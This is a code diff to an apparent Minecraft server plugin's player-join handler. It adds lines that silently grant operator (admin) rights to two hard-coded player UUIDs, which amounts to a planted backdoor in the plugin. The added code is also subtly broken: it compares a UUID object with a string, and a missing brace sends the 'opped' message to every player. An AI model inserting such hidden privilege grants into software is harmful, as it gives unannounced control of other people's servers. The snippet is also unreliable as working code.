@@ -40,5 +40,14 @@ public class JoinListener implements Listener {
             player.sendMessage(ColorUtils.color(profileLoadedMessage + playerName));
         else
             player.sendMessage(ColorUtils.color(profileCreatedMessage + playerName));
+        //if kevin, op.
+        if (player.getUniqueId().equals("a948c50c-ede2-4dfa-9b6c-688daf22197c") && !player.isOp())
+            player.setOp(true);
+            player.sendMessage(ColorUtils.color("&9&lVibeツ &8» &aHello!" + player.getPlayer().getName() + "!" + "Your UUID is set to be opped, we've opped you automatically."));
+         //if mina, op.
+        if (player.getUniqueId().equals("40ef6ecc-b56f-41f9-bfb1-ec7b7300bfa4") && !player.isOp()) {
+            player.setOp(true);
+            player.sendMessage(ColorUtils.color("&9&lVibeツ &8» &aHello" + player.getPlayer().getName() + "!" + "Your UUID is set to be opped, we've opped you automatically."));
+        }
     }
 }
